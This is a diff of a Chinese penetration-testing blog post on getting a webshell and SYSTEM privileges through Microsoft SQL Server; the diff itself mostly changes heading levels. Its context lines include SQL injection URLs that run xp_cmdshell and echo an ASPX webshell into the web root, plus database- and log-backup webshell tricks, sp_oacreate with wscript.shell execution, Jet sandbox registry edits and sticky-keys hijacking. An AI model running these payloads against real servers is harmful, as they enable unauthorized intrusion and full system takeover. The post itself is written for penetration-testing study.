@@ -1,11 +1,9 @@
 ---
 title: "MSSQL多种姿势拿shell和提权"
 date: 2019-05-21T22:19:55+08:00
-lastmod: 2019-05-21T22:19:55+08:00
 draft: false
 tags: ['mssql','shell']
 categories: ['渗透测试']
-comment: true
 ---
 
 继上一篇文章继续学习mssql。
@@ -14,7 +12,7 @@ comment: true
 
 本文全文转载404师傅的[MSSQL_SQL_BYPASS](<https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI>)，根据自己理解略有修改。
 
-# getshell
+## getshell
 
 能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。
 
@@ -25,7 +23,7 @@ comment: true
 
 我们先来了解下怎么去寻找web目录的绝对路径。
 
-## 寻找绝对路径
+### 寻找绝对路径
 
 1. 报错信息
 2. 字典猜
@@ -91,7 +89,7 @@ http://192.168.130.137/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdsh
 
 此时我们拿到绝对路径之后，我们接着往下看怎么拿shell
 
-## xp_cmdshell拿shell
+### xp_cmdshell拿shell
 
 xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径
 
@@ -101,7 +99,7 @@ http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Lang
 
 由于cmd写webshell的主意这些转义的问题 推荐使用certutil或者vbs什么的来下载
 
-## 差异备份拿shell
+### 差异备份拿shell
 
 ```mssql
 1. backup database 库名 to disk = 'c:\bak.bak';--
@@ -117,7 +115,7 @@ http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Lang
 
 当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。
 
-## log备份拿shell
+### log备份拿shell
 
 LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式
 
@@ -135,11 +133,11 @@ LOG备份的要求是他的数据库备份过，而且选择恢复模式得是�
 
 log备份的好处就是备份出来的webshell的文件大小非常的小
 
-# getsystem
+## getsystem
 
 我们继续来探究怎么进行提权
 
-## xp_cmdshell
+### xp_cmdshell
 
 在2005中xp_cmdshell的权限是system，2008中是network。
 
@@ -155,7 +153,7 @@ log备份的好处就是备份出来的webshell的文件大小非常的小
 
 通过下载文件之后用xp_cmdshell来执行我们的payload，通过Cobalt Strike来进行下一步操作，比如怼exp或许会更加方便。
 
-## sp_oacreate
+### sp_oacreate
 
 当xp_cmdshell 被删除可以使用这个来提权试试,恢复sp_oacreate
 
@@ -236,7 +234,7 @@ declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oameth
 
 当然这里只是一种思路，你完全可以用vbs来下载什么的
 
-## 沙盒提权
+### 沙盒提权
 
 ```mssql
 1. exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
@@ -255,7 +253,7 @@ declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oameth
 > 5，用SA写注册表的权限打开那个开关
 > 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令
 
-## xp_regwrite
+### xp_regwrite
 
 修改注册表 来劫持粘贴键 当然在2008数据库是不成立的 因为默认权限很低
 
